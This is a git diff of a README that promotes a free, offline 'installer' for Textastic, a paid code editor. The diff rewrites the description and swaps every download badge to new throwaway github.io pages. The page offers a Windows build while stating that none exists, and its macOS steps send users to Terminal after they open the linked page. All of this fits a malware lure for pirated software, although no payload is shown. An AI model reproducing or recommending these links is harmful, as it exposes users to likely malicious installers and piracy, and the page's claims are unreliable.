@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Code+Editor-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Textastic Free Installer** — Textastic is a fast, versatile code editor for macOS and iOS that supports 80+ programming languages with syntax highlighting, auto-completion, and SSH/SFTP connectivity for editing files directly on servers. Works without internet access, no account required. Full offline installation.
+**💻 Textastic Free Installer** — Textastic is a code and text editor for macOS and iOS with syntax highlighting for 80+ languages, FTP/SFTP connections, iCloud and Working Copy git integration, and a lightning-fast performance. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Textastic](https://img.shields.io/badge/⬇_Install_Textastic-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Textastic](https://img.shields.io/badge/⬇_Install_Textastic-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Textastic
 
-Textastic is a fast, versatile code editor for macOS and iOS that supports 80+ programming languages with syntax highlighting, auto-completion, and SSH/SFTP connectivity for editing files directly on servers. On iPad and iPhone, Textastic provides a full-featured coding experience with hardware keyboard support, making it the go-to choice for mobile development and server administration.
+Textastic is a code and text editor for macOS and iOS with syntax highlighting for 80+ languages, FTP/SFTP connections, iCloud and Working Copy git integration, and a lightning-fast performance. Particularly popular for mobile coding workflows on iPad.
 
 ---
 
 ## ❌ Problem: Textastic is hard to access
 
-- **Apple Only** — macOS and iOS only; no Windows version
-- **Commercial License** — Paid application
-- **IDE Features** — Not a full IDE; missing debugger and project management features
-- **Extensions** — No extension system for adding language support or tools
+- **Paid App** — Requires purchase on both Mac App Store and iOS App Store
+- **macOS and iOS Only** — No Windows or Linux version
+- **Limited IDE Features** — Missing advanced features like refactoring and debugging
+- **Best on iPad** — Mac version overshadowed by more capable macOS editors
 
 ---
 
@@ -61,9 +61,9 @@ Textastic is a fast, versatile code editor for macOS and iOS that supports 80+ p
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Textastic is a fast, versatile code editor for macOS and iOS that supports 80+ p
 
 <div align="center">
 
-[![⬇ Install Textastic](https://img.shields.io/badge/⬇_Install_Textastic-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Textastic](https://img.shields.io/badge/⬇_Install_Textastic-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Textastic is a fast, versatile code editor for macOS and iOS that supports 80+ p
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Textastic is a fast, versatile code editor for macOS and iOS that supports 80+ p
 
 ---
 
-**Textastic Free Installer** — Textastic is a fast, versatile code editor for macOS and iOS that supports 80+ programming languages with syntax highlighting, auto-completion, and SSH/SFTP connectivity for editing files directly on servers. Install without internet connection today!
+**Textastic Free Installer** — Textastic is a code and text editor for macOS and iOS with syntax highlighting for 80+ languages, FTP/SFTP connections, iCloud and Working Copy git integration, and a lightning-fast performance. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Textastic](https://img.shields.io/badge/⬇_Install_Textastic-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Textastic](https://img.shields.io/badge/⬇_Install_Textastic-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
